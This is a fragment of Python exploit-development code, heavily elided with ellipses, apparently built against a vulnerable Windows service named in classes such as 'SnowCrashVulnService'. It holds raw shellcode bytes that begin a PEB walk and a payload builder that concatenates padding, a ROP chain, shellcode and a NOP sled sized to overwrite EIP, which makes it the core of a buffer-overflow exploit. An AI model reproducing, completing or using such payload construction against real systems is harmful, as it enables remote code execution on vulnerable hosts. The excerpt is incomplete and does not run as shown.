...
class SnowCrashShellCode:
    ...
    def WriteShellCode(self):
        ...
        self.sc += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52"
        # \x14\x8b"
...
class SnowCrashVulnService:
    ...
    def CreateExploitPayload(self, sploit):
        ...
        offsetRopSkeleton = (self.OFFSET_EIP + 536) - cbSkeleton
        ...
        decodedShellcode = sploit.shellcode.GetShellCode()

        print(f"padsz: {offsetRopSkeleton}")
        buf = paddingToRopSkeleton + ropChain + paddingToShellcode + decodedShellcode
        nleft = cbBuf - len(buf) + 6
        print(f"nleft: {nleft}")
        tailPadding = b"\x90" * nleft

        buffer = (buf + tailPadding)
